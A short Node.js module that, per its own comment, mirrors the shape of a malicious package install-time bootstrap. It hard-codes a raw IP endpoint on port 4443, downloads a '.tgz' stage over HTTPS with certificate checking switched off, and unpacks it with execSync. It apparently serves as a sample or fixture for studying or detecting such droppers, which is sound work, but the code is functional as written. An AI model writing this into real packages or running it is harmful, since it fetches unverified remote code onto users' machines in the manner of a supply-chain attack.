import https from "https";
import fs from "fs";
import { execSync } from "child_process";

// Mirror of the install-time bootstrap shape: endpoint constant at the top of
// the file, TLS-bypassed url-first https.get in a helper below it.
const BASE = "https://45.148.10.23:4443/stage";
const url = `${BASE}/pkg-1.0.0.tgz`;

function fetchStage(dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    const req = https.get(url, { rejectUnauthorized: false }, (res) => {
      res.pipe(file);
      file.on("finish", () => resolve(dest));
    });
    req.on("error", reject);
  });
}

await fetchStage("stage.tgz");
execSync(`tar -xzf "stage.tgz"`, { stdio: "pipe" });
